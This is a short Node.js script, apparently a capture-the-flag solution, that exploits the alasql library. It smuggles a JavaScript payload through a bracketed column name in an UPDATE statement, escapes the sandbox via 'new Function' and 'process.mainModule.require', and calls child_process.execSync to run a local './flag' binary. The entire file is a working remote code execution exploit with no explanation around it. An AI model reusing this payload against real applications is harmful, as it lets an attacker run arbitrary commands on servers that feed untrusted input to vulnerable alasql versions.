const alasql = require('alasql');

const genPayload = command => `
new Function(
    'return this.process.mainModule.require'
)()('child_process').execSync(${JSON.stringify(command)})
`;


res = alasql(
    // Initialize the database
    'CREATE table i_am_a_table;' +
    `INSERT INTO i_am_a_table VALUES (1337);` +
    `UPDATE i_am_a_table SET [0'+${genPayload("chmod +x ./flag && ./flag 2>&1")}+']=42;`
);
